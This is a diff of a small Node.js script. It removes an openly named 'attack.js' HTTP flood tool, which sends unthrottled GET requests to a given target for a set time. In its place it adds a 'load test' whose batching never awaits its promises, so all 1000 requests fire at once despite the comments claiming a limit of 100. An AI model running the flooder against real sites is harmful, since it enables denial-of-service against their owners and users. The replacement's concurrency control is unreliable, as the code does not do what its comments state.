@@ -1,35 +1,44 @@
 const axios = require('axios');
 
-// Command-line args
-const [,, target, time] = process.argv;
+// Configuration
+const TARGET_URL = 'https://example.com'; // Change this to the target URL
+const CONCURRENT_REQUESTS = 100; // Number of concurrent requests to send
+const TOTAL_REQUESTS = 1000; // Total requests to send
 
-if (!target || !time || isNaN(time)) {
-  console.error('USAGE: node attack.js <target> <time_in_seconds>');
-  process.exit(1);
-}
-
-const duration = parseInt(time) * 1000; // Convert to milliseconds
-const startTime = Date.now();
-let requestsSent = 0;
-let errors = 0;
-
-const attack = async () => {
-  while (Date.now() - startTime < duration) {
-    axios.get(target)
-      .then(() => {
-        requestsSent++;
-      })
-      .catch(() => {
-        errors++;
-      });
+// Function to send HTTP requests
+const sendRequest = async () => {
+  try {
+    const response = await axios.get(TARGET_URL);
+    console.log(`Request sent: Status ${response.status}`);
+  } catch (error) {
+    console.error(`Request failed: ${error.message}`);
   }
-
-  // Wait a moment to let remaining promises resolve
-  setTimeout(() => {
-    console.log(`Attack complete.`);
-    console.log(`Total requests sent: ${requestsSent}`);
-    console.log(`Total errors: ${errors}`);
-  }, 2000);
 };
 
-attack();
+// Function to perform load testing
+const performLoadTest = () => {
+  const requestPromises = [];
+
+  // Create requests in batches
+  for (let i = 0; i < TOTAL_REQUESTS; i++) {
+    requestPromises.push(sendRequest());
+    
+    // If the number of concurrent requests reaches the limit, wait for all to finish
+    if (requestPromises.length >= CONCURRENT_REQUESTS) {
+      Promise.all(requestPromises).then(() => {
+        console.log(`${CONCURRENT_REQUESTS} requests completed.`);
+        requestPromises.length = 0; // Reset the request queue
+      });
+    }
+  }
+
+  // Handle remaining requests that are less than the concurrent limit
+  if (requestPromises.length > 0) {
+    Promise.all(requestPromises).then(() => {
+      console.log('All requests completed.');
+    });
+  }
+};
+
+// Run the load test
+performLoadTest();
